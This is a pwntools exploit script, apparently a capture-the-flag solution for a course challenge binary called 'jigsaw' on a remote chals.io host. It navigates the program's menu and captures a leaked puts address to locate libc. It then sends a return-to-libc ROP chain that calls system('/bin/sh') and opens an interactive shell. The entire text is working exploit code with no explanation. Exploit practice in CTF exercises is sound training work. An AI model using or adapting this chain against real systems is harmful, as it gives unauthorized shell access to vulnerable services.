from pwn import *

binary = 'jigsaw'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
libc = ELF('./libc.so.6')
r = ROP(libc)

p = remote("cse4850-bin3.chals.io", 443, ssl=True, sni="cse4850-bin3.chals.io")
#p = process(binary)

p.sendlineafter(b'Bear Trap \n', b"2")

p.recvuntil(b'Jelly Trap \n')
p.sendline(b"1")

p.recvuntil(b'Helix Trap \n')
p.sendline(b"1")

# read until puts leak
p.recvuntil(b': ')

# save leak address
address = int(p.recvline(), 16)

#print(hex(address))
#print(hex(libc.sym['puts']))

offset = (address - libc.sym['puts'])
#print(hex(offset))

chain = cyclic(16)
chain += p64(offset + r.find_gadget(['ret'])[0])
chain += p64(offset + r.find_gadget(['pop rdi','ret'])[0])
chain += p64(offset + next(libc.search(b'/bin/sh')))
chain += p64(offset + libc.sym['system'])

p.sendline(chain)
p.interactive()
